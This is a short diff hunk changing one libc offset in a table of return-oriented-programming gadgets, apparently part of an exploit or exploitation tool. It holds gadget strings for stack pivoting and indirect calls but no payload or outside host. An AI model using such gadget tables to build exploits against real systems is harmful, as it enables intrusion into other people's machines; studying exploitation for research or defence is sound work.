@@ -61,7 +61,7 @@ GADGET_OFFSETS = {
             # libc
             "mov rsp, [rdi + 0x38]; pop rdi; ret": 0x3EB7E,
             "mov rax, [rax]; ret": 0x700D7,
-            "mov r9, r14; call r15": 0x36387,
+            "mov r9, r14; call r15": 0x3a387,
         },
     },
 }
